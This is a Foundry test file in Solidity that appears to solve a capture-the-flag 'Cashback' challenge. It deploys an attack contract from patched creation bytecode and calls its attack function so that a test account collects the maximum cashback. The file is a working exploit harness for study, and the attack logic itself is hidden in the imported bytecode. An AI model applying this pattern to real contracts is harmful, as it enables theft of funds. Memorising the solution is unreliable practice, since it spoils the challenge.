// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Currency, CurrencyLibrary, Cashback} from "./Cashback.sol";
import {
    ICashbackAttack,
    BASIS_POINTS,
    NATIVE_CASHBACK_RATE,
    NATIVE_MAX_CASHBACK,
    FREEDOM_CASHBACK_RATE,
    FREEDOM_MAX_CASHBACK,
    FREEDOM_ADDR,
    SUPER_NFT_ADDR,
    ATTACK_CREATION_BYTECODE
} from "./CashbackAttack.sol";
import {Test} from "forge-std/Test.sol";

// forge-lint: disable-next-item(asm-keccak256)
contract SolveCashback is Test {
    Cashback cashback;
    ICashbackAttack cc;

    address payable alice;
    uint256 aliceSK;

    function setUp() public {
        address deployer = makeAddr("deployer");
        vm.startPrank(deployer);

        // currencies
        address[] memory _currencies = new address[](2);
        _currencies[0] = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        _currencies[1] = FREEDOM_ADDR;

        // cashback
        uint256[] memory _cashbacks = new uint256[](2);
        _cashbacks[0] = NATIVE_CASHBACK_RATE;
        _cashbacks[1] = FREEDOM_CASHBACK_RATE;

        // maxCashback
        uint256[] memory _maxCashbacks = new uint256[](2);
        _maxCashbacks[0] = NATIVE_MAX_CASHBACK;
        _maxCashbacks[1] = FREEDOM_MAX_CASHBACK;

        // superCashbackNFT addr
        address _superCashbackNFT = SUPER_NFT_ADDR;

        cashback = new Cashback(_currencies, _cashbacks, _maxCashbacks, _superCashbackNFT);

        // deploy the creation bytecode of attack contract
        address addr;
        bytes memory creation = _updateCashbackAddrInCode(ATTACK_CREATION_BYTECODE, address(cashback));
        assembly {
            addr := create(0, add(creation, 0x20), mload(creation))
        }
        require(addr != address(0), "CREATE failed");
        emit log_bytes(addr.code);
        cc = ICashbackAttack(addr);

        _setUpAccounts();

        vm.stopPrank();
    }

    function _updateCashbackAddrInCode(bytes memory code, address cashbackAddr)
        internal
        pure
        returns (bytes memory creation)
    {
        uint256 byteAddrStart = 16;
        creation = code;

        bytes20 addrBytes = bytes20(cashbackAddr);
        for (uint256 i = 0; i < 20; ++i) {
            creation[byteAddrStart + i] = addrBytes[i];
        }
    }

    function _setUpAccounts() internal {
        aliceSK = 0xA11CE;
        alice = payable(vm.addr(aliceSK));
        vm.deal(alice, 1 ether);
        vm.label(alice, "alice");
    }

    function testSolveCashback() public {
        vm.startPrank(alice, alice);

        // native currency
        address currencyAddr = Currency.unwrap(CurrencyLibrary.NATIVE_CURRENCY);
        uint256 expenseAmt = NATIVE_MAX_CASHBACK * BASIS_POINTS / NATIVE_CASHBACK_RATE;
        cc.attack(address(cashback), alice, currencyAddr, expenseAmt, NATIVE_MAX_CASHBACK);

        // native currency: check the state
        uint256 cashbackAmt = cashback.balanceOf(alice, CurrencyLibrary.NATIVE_CURRENCY.toId());
        assertEq(cashbackAmt, NATIVE_MAX_CASHBACK);

        vm.stopPrank();
    }
}
